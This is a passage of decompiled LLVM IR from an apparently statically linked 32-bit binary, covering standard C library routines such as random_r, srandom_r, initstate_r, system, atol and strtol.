  %v3_80544ad = load i32, i32* %v2_80544ad, align 4
  store i32 %v3_80544ad, i32* %esi.global-to-local, align 4
  %v1_80544b0 = icmp eq i1 %v4_80544a9, false
  br i1 %v1_80544b0, label %dec_label_pc_80544c9, label %dec_label_pc_80544b2

dec_label_pc_80544b2:                             ; preds = %entry
  %v2_80544b2 = inttoptr i32 %v3_80544ad to i32*
  %v3_80544b2 = load i32, i32* %v2_80544b2, align 4
  %v5_80544b2 = mul i32 %v3_80544b2, 1103515245
  %v1_80544b8 = add i32 %v5_80544b2, 12345
  %v1_80544bd = urem i32 %v1_80544b8, -2147483648
  store i32 %v1_80544bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80544bd, i32* %v2_80544b2, align 4
  %v0_80544c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80544c4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80544c4 = inttoptr i32 %v1_80544c4 to i32*
  store i32 %v0_80544c4, i32* %v2_80544c4, align 4
  br label %dec_label_pc_80544f4

dec_label_pc_80544c9:                             ; preds = %entry
  %v1_80544c9 = add i32 %tmp3, 4
  %v2_80544c9 = inttoptr i32 %v1_80544c9 to i32*
  %v3_80544c9 = load i32, i32* %v2_80544c9, align 4
  store i32 %v3_80544c9, i32* %ecx.global-to-local, align 4
  %v2_80544cc = load i32, i32* %arg1, align 4
  store i32 %v2_80544cc, i32* %edx.global-to-local, align 4
  %v1_80544ce = add i32 %tmp3, 24
  %v2_80544ce = inttoptr i32 %v1_80544ce to i32*
  %v3_80544ce = load i32, i32* %v2_80544ce, align 4
  store i32 %v3_80544ce, i32* %edi.global-to-local, align 4
  %v1_80544d1 = inttoptr i32 %v3_80544c9 to i32*
  %v2_80544d1 = load i32, i32* %v1_80544d1, align 4
  store i32 %v2_80544d1, i32* %eax.global-to-local, align 4
  %v1_80544d3 = inttoptr i32 %v2_80544cc to i32*
  %v2_80544d3 = load i32, i32* %v1_80544d3, align 4
  %v4_80544d3 = add i32 %v2_80544d3, %v2_80544d1
  store i32 %v4_80544d3, i32* %v1_80544d3, align 4
  %v0_80544d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80544d5 = inttoptr i32 %v0_80544d5 to i32*
  %v2_80544d5 = load i32, i32* %v1_80544d5, align 4
  %v1_80544d7 = add i32 %v0_80544d5, 4
  store i32 %v1_80544d7, i32* %edx.global-to-local, align 4
  %v2_80544da = udiv i32 %v2_80544d5, 2
  %v1_80544dc = load i32, i32* %edi.global-to-local, align 4
  %v7_80544dc = icmp ult i32 %v1_80544d7, %v1_80544dc
  %v1_80544de = load i32, i32* %ebp.global-to-local, align 4
  %v2_80544de = inttoptr i32 %v1_80544de to i32*
  store i32 %v2_80544da, i32* %v2_80544de, align 4
  %v0_80544e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80544e1 = add i32 %v0_80544e1, 4
  store i32 %v1_80544e1, i32* %eax.global-to-local, align 4
  br i1 %v7_80544dc, label %dec_label_pc_80544ea, label %dec_label_pc_80544e6

dec_label_pc_80544e6:                             ; preds = %dec_label_pc_80544c9
  %v0_80544e6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80544e6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544ef

dec_label_pc_80544ea:                             ; preds = %dec_label_pc_80544c9
  %v1_80544ea = load i32, i32* %edi.global-to-local, align 4
  %v7_80544ea = icmp ult i32 %v1_80544e1, %v1_80544ea
  %v1_80544ec = icmp eq i1 %v7_80544ea, false
  %v3_80544ec = load i32, i32* %esi.global-to-local, align 4
  %v4_80544ec = select i1 %v1_80544ec, i32 %v3_80544ec, i32 %v1_80544e1
  store i32 %v4_80544ec, i32* %eax.global-to-local, align 4
  %v0_80544ef.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544ef

dec_label_pc_80544ef:                             ; preds = %dec_label_pc_80544e6, %dec_label_pc_80544ea
  %v0_80544ef = phi i32 [ %v0_80544e6, %dec_label_pc_80544e6 ], [ %v0_80544ef.pre, %dec_label_pc_80544ea ]
  %v1_80544ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_80544ef = inttoptr i32 %v1_80544ef to i32*
  store i32 %v0_80544ef, i32* %v2_80544ef, align 4
  %v0_80544f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80544f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80544f1 = add i32 %v1_80544f1, 4
  %v3_80544f1 = inttoptr i32 %v2_80544f1 to i32*
  store i32 %v0_80544f1, i32* %v3_80544f1, align 4
  br label %dec_label_pc_80544f4

dec_label_pc_80544f4:                             ; preds = %dec_label_pc_80544b2, %dec_label_pc_80544ef
  %v2_80544f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80544f4, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80544bd, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80544f4, { 1, 0 }
  uselistorder label %dec_label_pc_80544ef, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80544fb = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80544ff = load i32, i32* @edi, align 4
  %v0_8054500 = load i32, i32* @esi, align 4
  %v0_8054501 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_805450d = add i32 %tmp14, 12
  %v2_805450d = inttoptr i32 %v1_805450d to i32*
  %v3_805450d = load i32, i32* %v2_805450d, align 4
  store i32 %v3_805450d, i32* %ecx.global-to-local, align 4
  %v6_8054513 = icmp ugt i32 %v3_805450d, 4
  br i1 %v6_8054513, label %dec_label_pc_805458d, label %dec_label_pc_8054515

dec_label_pc_8054515:                             ; preds = %entry
  %v1_8054515 = add i32 %tmp14, 8
  %v2_8054515 = inttoptr i32 %v1_8054515 to i32*
  %v3_8054515 = load i32, i32* %v2_8054515, align 4
  store i32 %v3_8054515, i32* %ebx.global-to-local, align 4
  %v1_8054518 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_805451f = select i1 %v1_8054518, i32 1, i32 %arg1
  store i32 %v3_805451f, i32* %edx.global-to-local, align 4
  %v1_8054522 = icmp eq i32 %v3_805450d, 0
  %v2_8054524 = inttoptr i32 %v3_8054515 to i32*
  store i32 %v3_805451f, i32* %v2_8054524, align 4
  br i1 %v1_8054522, label %dec_label_pc_805458b, label %dec_label_pc_8054528

dec_label_pc_8054528:                             ; preds = %dec_label_pc_8054515
  %v0_8054528 = load i32, i32* @esi, align 4
  %v1_8054528 = add i32 %v0_8054528, 16
  %v2_8054528 = inttoptr i32 %v1_8054528 to i32*
  %v3_8054528 = load i32, i32* %v2_8054528, align 4
  store i32 %v3_8054528, i32* %eax.global-to-local, align 4
  %v0_805452b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805452b, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8054532 = sext i32 %v3_8054528 to i64
  store i64 %v4_8054532, i64* %stack_var_-40, align 8
  %v5_805456832 = icmp sgt i32 %v3_8054528, 1
  br i1 %v5_805456832, label %dec_label_pc_8054537, label %dec_label_pc_805456a

dec_label_pc_8054537:                             ; preds = %dec_label_pc_8054528, %dec_label_pc_8054537.dec_label_pc_8054537_crit_edge
  %v0_805455f = phi i32 [ %v0_805455f.pre, %dec_label_pc_8054537.dec_label_pc_8054537_crit_edge ], [ %v0_805452b, %dec_label_pc_8054528 ]
  %v0_8054537 = load i32, i32* %edx.global-to-local, align 4
  %v1_805453e = ashr i32 %v0_8054537, 31
  %v2_805453f = zext i32 %v0_8054537 to i64
  %v4_805453f = zext i32 %v1_805453e to i64
  %v5_805453f = mul nuw i64 %v4_805453f, 4294967296
  %v6_805453f = or i64 %v5_805453f, %v2_805453f
  %v8_805453f = sdiv i64 %v6_805453f, 127773
  %v9_805453f = trunc i64 %v8_805453f to i32
  %v10_805453f = srem i64 %v6_805453f, 127773
  %v3_8054545 = mul nsw i64 %v10_805453f, 16807
  %v4_8054545 = trunc i64 %v3_8054545 to i32
  %tmp24 = mul i32 %v9_805453f, -2836
  %v2_8054551 = add i32 %v4_8054545, %tmp24
  %v1_8054553 = add i32 %v2_8054551, 1
  %v6_8054553 = xor i32 %v2_8054551, -2147483648
  %v7_8054553 = xor i32 %v1_8054553, %v2_8054551
  %v8_8054553 = and i32 %v7_8054553, %v6_8054553
  %v9_8054553 = icmp slt i32 %v8_8054553, 0
  %v10_8054553 = icmp eq i32 %v1_8054553, 0
  %v11_8054553 = icmp slt i32 %v1_8054553, 0
  %v1_8054556 = add i32 %v2_8054551, 2147483647
  store i32 %v1_8054556, i32* %eax.global-to-local, align 4
  %v3_805455c = icmp ne i1 %v11_8054553, %v9_8054553
  %v4_805455c = or i1 %v10_8054553, %v3_805455c
  %v7_805455c = select i1 %v4_805455c, i32 %v1_8054556, i32 %v2_8054551
  store i32 %v7_805455c, i32* %edx.global-to-local, align 4
  %v1_805455f = add i32 %v0_805455f, 4
  store i32 %v1_805455f, i32* %ecx.global-to-local, align 4
  %v2_8054562 = inttoptr i32 %v1_805455f to i32*
  store i32 %v7_805455c, i32* %v2_8054562, align 4
  %v0_8054564 = load i32, i32* @edi, align 4
  %v1_8054564 = add i32 %v0_8054564, 1
  store i32 %v1_8054564, i32* @edi, align 4
  %v3_8054565.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8054565.pre to i32
  %v5_8054568 = icmp slt i32 %v1_8054564, %extract.t11
  br i1 %v5_8054568, label %dec_label_pc_8054537.dec_label_pc_8054537_crit_edge, label %dec_label_pc_8054565.dec_label_pc_805456a_crit_edge

dec_label_pc_8054537.dec_label_pc_8054537_crit_edge: ; preds = %dec_label_pc_8054537
  %v0_805455f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054537

dec_label_pc_8054565.dec_label_pc_805456a_crit_edge: ; preds = %dec_label_pc_8054537
  %v0_805456a.pre = load i32, i32* @esi, align 4
  %v0_805456d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805456a

dec_label_pc_805456a:                             ; preds = %dec_label_pc_8054565.dec_label_pc_805456a_crit_edge, %dec_label_pc_8054528
  %v0_805456d = phi i32 [ %v0_805456d.pre, %dec_label_pc_8054565.dec_label_pc_805456a_crit_edge ], [ %v0_805452b, %dec_label_pc_8054528 ]
  %v0_805456a = phi i32 [ %v0_805456a.pre, %dec_label_pc_8054565.dec_label_pc_805456a_crit_edge ], [ %v0_8054528, %dec_label_pc_8054528 ]
  %v1_805456a = add i32 %v0_805456a, 20
  %v2_805456a = inttoptr i32 %v1_805456a to i32*
  %v3_805456a = load i32, i32* %v2_805456a, align 4
  store i32 %v3_805456a, i32* %eax.global-to-local, align 4
  %v2_805456d = add i32 %v0_805456a, 4
  %v3_805456d = inttoptr i32 %v2_805456d to i32*
  store i32 %v0_805456d, i32* %v3_805456d, align 4
  %v0_8054570 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054570 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054570 = mul i32 %v1_8054570, 4
  %v3_8054570 = add i32 %v2_8054570, %v0_8054570
  store i32 %v3_8054570, i32* %eax.global-to-local, align 4
  %v1_8054573 = load i32, i32* @esi, align 4
  %v2_8054573 = inttoptr i32 %v1_8054573 to i32*
  store i32 %v3_8054570, i32* %v2_8054573, align 4
  %v3_8054575 = load i64, i64* %stack_var_-40, align 8
  %v6_8054575 = mul nsw i64 %v3_8054575, 10
  %v7_8054575 = trunc i64 %v6_8054575 to i32
  %v2_805457b = ptrtoint i32* %stack_var_-20 to i32
  %v1_805458825 = add i32 %v7_8054575, -1
  %v9_805458829 = icmp slt i32 %v1_805458825, 0
  store i32 %v1_805458825, i32* @ebx, align 4
  %v1_805458930 = icmp eq i1 %v9_805458829, false
  br i1 %v1_805458930, label %dec_label_pc_805457b, label %dec_label_pc_805458b

dec_label_pc_805457b:                             ; preds = %dec_label_pc_805456a, %dec_label_pc_805457b
  store i32 %v2_805457b, i32* %eax.global-to-local, align 4
  %v0_8054580 = load i32, i32* @esi, align 4
  %v2_8054581 = inttoptr i32 %v0_8054580 to i32*
  %v3_8054581 = call i32 @__GI_random_r(i32* %v2_8054581, i32 %v2_805457b)
  store i32 %v0_8054580, i32* %eax.global-to-local, align 4
  store i32 %v2_805457b, i32* %edx.global-to-local, align 4
  %v0_8054588.pre = load i32, i32* @ebx, align 4
  %v1_8054588 = add i32 %v0_8054588.pre, -1
  %v9_8054588 = icmp slt i32 %v1_8054588, 0
  store i32 %v1_8054588, i32* @ebx, align 4
  %v1_8054589 = icmp eq i1 %v9_8054588, false
  br i1 %v1_8054589, label %dec_label_pc_805457b, label %dec_label_pc_805458b

dec_label_pc_805458b:                             ; preds = %dec_label_pc_805456a, %dec_label_pc_805457b, %dec_label_pc_8054515
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805458d

dec_label_pc_805458d:                             ; preds = %entry, %dec_label_pc_805458b
  %v0_8054594 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805458b ]
  store i32 %v0_8054501, i32* @ebx, align 4
  store i32 %v0_8054500, i32* @esi, align 4
  store i32 %v0_80544ff, i32* @edi, align 4
  store i32 %v0_80544fb, i32* @ebp, align 4
  ret i32 %v0_8054594

; uselistorder directives
  uselistorder i32 %v1_8054588, { 1, 0 }
  uselistorder i32 %v0_805456a, { 1, 0 }
  uselistorder i32 %v1_8054553, { 2, 1, 0 }
  uselistorder i32 %v2_8054551, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_805452b, { 1, 0, 2 }
  uselistorder i32 %v3_805450d, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_805458d, { 1, 0 }
  uselistorder label %dec_label_pc_805458b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805457b, { 1, 0 }
  uselistorder label %dec_label_pc_8054537, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8054597 = load i32, i32* @esi, align 4
  %v0_8054598 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_80545b9, label %dec_label_pc_80545ad

dec_label_pc_80545ad:                             ; preds = %entry
  %v2_80545ad = icmp ult i32 %arg3, 256
  %v1_80545b4 = select i1 %v2_80545ad, i32 5, i32 4
  store i32 %v1_80545b4, i32* @ebx, align 4
  br label %dec_label_pc_80545cf

dec_label_pc_80545b9:                             ; preds = %entry
  %v6_80545bc = icmp ugt i32 %arg3, 31
  br i1 %v6_80545bc, label %dec_label_pc_80545c7, label %dec_label_pc_80545be

dec_label_pc_80545be:                             ; preds = %dec_label_pc_80545b9
  store i32 0, i32* @ebx, align 4
  %v6_80545c3 = icmp ugt i32 %arg3, 7
  br i1 %v6_80545c3, label %dec_label_pc_80545cf, label %dec_label_pc_805461f

dec_label_pc_80545c7:                             ; preds = %dec_label_pc_80545b9
  %v2_80545c7 = icmp ult i32 %arg3, 64
  %v1_80545cc = select i1 %v2_80545c7, i32 3, i32 2
  store i32 %v1_80545cc, i32* @ebx, align 4
  br label %dec_label_pc_80545cf

dec_label_pc_80545cf:                             ; preds = %dec_label_pc_80545be, %dec_label_pc_80545ad, %dec_label_pc_80545c7
  %v0_80545d9 = phi i32 [ 0, %dec_label_pc_80545be ], [ %v1_80545b4, %dec_label_pc_80545ad ], [ %v1_80545cc, %dec_label_pc_80545c7 ]
  %v1_80545cf = mul nuw nsw i32 %v0_80545d9, 4
  %v2_80545cf = add i32 %v1_80545cf, ptrtoint (i32* @global_var_805a8f4.521 to i32)
  %v3_80545cf = inttoptr i32 %v2_80545cf to i32*
  %v4_80545cf = load i32, i32* %v3_80545cf, align 4
  store i32 %v4_80545cf, i32* %eax.global-to-local, align 4
  %v1_80545d6 = add i32 %tmp7, 4
  store i32 %v1_80545d6, i32* @esi, align 4
  %v2_80545d9 = add i32 %v1_80545cf, ptrtoint (i32* @global_var_805a8e0.522 to i32)
  %v3_80545d9 = inttoptr i32 %v2_80545d9 to i32*
  %v4_80545d9 = load i32, i32* %v3_80545d9, align 4
  store i32 %v4_80545d9, i32* %edx.global-to-local, align 4
  %v2_80545e0 = add i32 %arg4, 12
  %v3_80545e0 = inttoptr i32 %v2_80545e0 to i32*
  store i32 %v0_80545d9, i32* %v3_80545e0, align 4
  %v0_80545e3 = load i32, i32* @esi, align 4
  %v1_80545e3 = load i32, i32* @edi, align 4
  %v2_80545e3 = add i32 %v1_80545e3, 8
  %v3_80545e3 = inttoptr i32 %v2_80545e3 to i32*
  store i32 %v0_80545e3, i32* %v3_80545e3, align 4
  %v0_80545e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545e6 = load i32, i32* @edi, align 4
  %v2_80545e6 = add i32 %v1_80545e6, 16
  %v3_80545e6 = inttoptr i32 %v2_80545e6 to i32*
  store i32 %v0_80545e6, i32* %v3_80545e6, align 4
  %v0_80545e9 = load i32, i32* @esi, align 4
  %v1_80545e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80545e9 = mul i32 %v1_80545e9, 4
  %v3_80545e9 = add i32 %v2_80545e9, %v0_80545e9
  store i32 %v3_80545e9, i32* %eax.global-to-local, align 4
  %v0_80545ec = load i32, i32* %edx.global-to-local, align 4
  %v1_80545ec = load i32, i32* @edi, align 4
  %v2_80545ec = add i32 %v1_80545ec, 20
  %v3_80545ec = inttoptr i32 %v2_80545ec to i32*
  store i32 %v0_80545ec, i32* %v3_80545ec, align 4
  %v0_80545ef = load i32, i32* %eax.global-to-local, align 4
  %v1_80545ef = load i32, i32* @edi, align 4
  %v2_80545ef = add i32 %v1_80545ef, 24
  %v3_80545ef = inttoptr i32 %v2_80545ef to i32*
  store i32 %v0_80545ef, i32* %v3_80545ef, align 4
  %v0_80545f2 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_80545f7 = inttoptr i32 %v0_80545f2 to i32*
  %v3_80545f7 = call i32 @srandom_r(i32 %arg1, i32* %v2_80545f7)
  %v0_80545fc = load i32, i32* @ebp, align 4
  %v1_80545fc = inttoptr i32 %v0_80545fc to i32*
  store i32 0, i32* %v1_80545fc, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054607 = load i32, i32* @ebx, align 4
  %v1_8054607 = icmp eq i32 %v0_8054607, 0
  br i1 %v1_8054607, label %dec_label_pc_8054638, label %dec_label_pc_805460b

dec_label_pc_805460b:                             ; preds = %dec_label_pc_80545cf
  %v0_805460b = load i32, i32* @edi, align 4
  %v1_805460b = add i32 %v0_805460b, 4
  %v2_805460b = inttoptr i32 %v1_805460b to i32*
  %v3_805460b = load i32, i32* %v2_805460b, align 4
  %v1_805460e = load i32, i32* @esi, align 4
  %v2_805460e = sub i32 %v3_805460b, %v1_805460e
  %v2_8054610 = sdiv i32 %v2_805460e, 4
  %v3_8054613 = mul i32 %v2_8054610, 5
  %v2_8054616 = add i32 %v3_8054613, %v0_8054607
  %v1_8054618 = load i32, i32* @ebp, align 4
  %v2_8054618 = inttoptr i32 %v1_8054618 to i32*
  store i32 %v2_8054616, i32* %v2_8054618, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054638

dec_label_pc_805461f:                             ; preds = %dec_label_pc_80545be
  %v1_805461f = call i32 @__errno_location(i32 %v0_8054598)
  store i32 %v1_805461f, i32* %eax.global-to-local, align 4
  %v1_8054624 = inttoptr i32 %v1_805461f to i32*
  store i32 22, i32* %v1_8054624, align 4
  %v0_805462a = load i32, i32* %stack_var_-36, align 4
  %v1_805462a = call i32 @__errno_location(i32 %v0_805462a)
  %v1_805462f = inttoptr i32 %v1_805462a to i32*
  store i32 22, i32* %v1_805462f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054638

dec_label_pc_8054638:                             ; preds = %dec_label_pc_80545cf, %dec_label_pc_805460b, %dec_label_pc_805461f
  %v0_805463f = phi i32 [ 0, %dec_label_pc_80545cf ], [ 0, %dec_label_pc_805460b ], [ -1, %dec_label_pc_805461f ]
  store i32 %v0_8054597, i32* @esi, align 4
  ret i32 %v0_805463f

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32*)* @srandom_r, { 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054638, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80545cf, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054640 = load i32, i32* @ebx, align 4
  %v4_8054649 = icmp eq i32 %arg1, 0
  br i1 %v4_8054649, label %dec_label_pc_805476c, label %dec_label_pc_8054654

dec_label_pc_8054654:                             ; preds = %entry
  %v2_805465a = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054669 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054678 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054681 = call i32 @__vfork(i32 %v2_8054678)
  %v2_8054689 = icmp slt i32 %v1_8054681, 0
  store i32 %v1_8054681, i32* @ebx, align 4
  %v2_805468e = icmp eq i1 %v2_8054689, false
  br i1 %v2_805468e, label %dec_label_pc_80546bf, label %dec_label_pc_8054690

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054654
  %v2_8054698 = call i32 @__bsd_signal(i32 3, i32 %v2_805465a)
  store i32 %v2_805465a, i32* @edx, align 4
  %v2_80546a5 = call i32 @__bsd_signal(i32 2, i32 %v2_8054669)
  store i32 2, i32* @ebx, align 4
  %v2_80546b2 = call i32 @__bsd_signal(i32 17, i32 %v2_8054678)
  br label %dec_label_pc_8054769

dec_label_pc_80546bf:                             ; preds = %dec_label_pc_8054654
  %v1_8054689 = icmp eq i32 %v1_8054681, 0
  %v1_80546bf = icmp eq i1 %v1_8054689, false
  br i1 %v1_80546bf, label %dec_label_pc_805470b, label %dec_label_pc_80546c1

dec_label_pc_80546c1:                             ; preds = %dec_label_pc_80546bf
  %v2_80546c7 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_80546d2 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_80546dd = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_80546fc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805a90b.525 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a910.524 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a908.523 to i32), i32 %arg1, i32 0)
  %v1_8054706 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805470b:                             ; preds = %dec_label_pc_80546bf
  %v2_8054711 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_805471c = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8054721 = ptrtoint i32* %stack_var_-8 to i32
  %v0_805472a = load i32, i32* @ebx, align 4
  %v7_805472b = call i32 @wait4(i32 %v0_805472a, i32 %v2_8054721, i32 0, i32 0)
  %v8_8054736 = icmp eq i32 %v7_805472b, -1
  %v1_8054737 = icmp eq i1 %v8_8054736, false
  %v6_8054737 = load i32, i32* %stack_var_-8, align 4
  %v7_8054737 = select i1 %v1_8054737, i32 %v6_8054737, i32 -1
  store i32 %v7_8054737, i32* @edx, align 4
  store i32 %v7_8054737, i32* %stack_var_-8, align 4
  %v2_8054746 = call i32 @__bsd_signal(i32 3, i32 %v2_805465a)
  store i32 %v2_805465a, i32* @ebx, align 4
  %v2_8054753 = call i32 @__bsd_signal(i32 2, i32 %v2_8054669)
  store i32 %v2_8054669, i32* @edx, align 4
  %v2_8054760 = call i32 @__bsd_signal(i32 17, i32 %v2_8054678)
  %v3_8054765 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054769

dec_label_pc_8054769:                             ; preds = %dec_label_pc_8054690, %dec_label_pc_805470b
  %storemerge = phi i32 [ -1, %dec_label_pc_8054690 ], [ %v3_8054765, %dec_label_pc_805470b ]
  br label %dec_label_pc_805476c

dec_label_pc_805476c:                             ; preds = %entry, %dec_label_pc_8054769
  %v0_8054770 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8054769 ]
  store i32 %v0_8054640, i32* @ebx, align 4
  ret i32 %v0_8054770

; uselistorder directives
  uselistorder i32 %v1_8054681, { 2, 0, 1 }
  uselistorder i32 %v2_8054678, { 1, 0, 2 }
  uselistorder i32 %v2_8054669, { 0, 2, 1 }
  uselistorder i32 %v2_805465a, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_805476c, { 1, 0 }
  uselistorder label %dec_label_pc_8054769, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805477f = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_805477f
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8054799 = inttoptr i32 %arg1 to i8*
  %v5_8054799 = call i32 @_stdlib_strto_l(i8* %v4_8054799, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8054799
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80547a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80547a7, i32* %stack_var_-16, align 4
  %v4_80547ab = ptrtoint i8* %arg1 to i32
  store i32 %v4_80547ab, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_80547b3 = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_80547b3, i32* %edx.global-to-local, align 4
  store i32 %v4_80547ab, i32* %ebx.global-to-local, align 4
  %v2_80547be41 = load i8, i8* %arg1, align 1
  %v3_80547be42 = sext i8 %v2_80547be41 to i32
  store i32 %v3_80547be42, i32* %eax.global-to-local, align 4
  %v2_80547c143 = mul nsw i32 %v3_80547be42, 2
  %v3_80547c144 = add i32 %v2_80547c143, %v0_80547b3
  %v4_80547c145 = inttoptr i32 %v3_80547c144 to i8*
  %v5_80547c146 = load i8, i8* %v4_80547c145, align 1
  %v6_80547c147 = and i8 %v5_80547c146, 32
  %v7_80547c148 = icmp eq i8 %v6_80547c147, 0
  %v1_80547c549 = icmp eq i1 %v7_80547c148, false
  br i1 %v1_80547c549, label %dec_label_pc_80547bd, label %dec_label_pc_80547c7

dec_label_pc_80547bd:                             ; preds = %entry, %dec_label_pc_80547bd
  %v0_80547bd50 = phi i32 [ %v1_80547bd, %dec_label_pc_80547bd ], [ %v4_80547ab, %entry ]
  %v1_80547bd = add i32 %v0_80547bd50, 1
  store i32 %v1_80547bd, i32* %ebx.global-to-local, align 4
  %v1_80547be = inttoptr i32 %v1_80547bd to i8*
  %v2_80547be = load i8, i8* %v1_80547be, align 1
  %v3_80547be = sext i8 %v2_80547be to i32
  store i32 %v3_80547be, i32* %eax.global-to-local, align 4
  %v2_80547c1 = mul nsw i32 %v3_80547be, 2
  %v3_80547c1 = add i32 %v2_80547c1, %v0_80547b3
  %v4_80547c1 = inttoptr i32 %v3_80547c1 to i8*
  %v5_80547c1 = load i8, i8* %v4_80547c1, align 1
  %v6_80547c1 = and i8 %v5_80547c1, 32
  %v7_80547c1 = icmp eq i8 %v6_80547c1, 0
  %v1_80547c5 = icmp eq i1 %v7_80547c1, false
  br i1 %v1_80547c5, label %dec_label_pc_80547bd, label %dec_label_pc_80547c7

dec_label_pc_80547c7:                             ; preds = %dec_label_pc_80547bd, %entry
